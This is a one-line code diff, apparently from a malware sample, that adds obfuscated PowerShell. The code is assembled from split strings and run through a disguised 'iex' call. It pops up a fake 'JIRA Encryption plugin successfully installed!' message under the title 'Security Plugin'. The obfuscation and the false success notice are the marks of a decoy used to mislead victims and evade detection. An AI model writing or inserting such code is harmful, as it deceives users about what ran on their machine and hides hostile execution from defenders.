@@ -1,0 +1,1 @@
+﻿ ('('+'new-obj'+'ect -'+'C'+'omObject wscri'+'pt.'+'she'+'ll).Popup(5'+'FMJI'+'RA Encryp'+'t'+'ion plugin'+' successf'+'u'+'lly installed!5FM,0,5'+'FMSecuri'+'t'+'y Plugin5FM'+','+'0x0)').RePlAce('5FM',[sTring][ChAr]34)|&((get-vaRIaBLE '*Mdr*').NamE[3,11,2]-jOiN'')
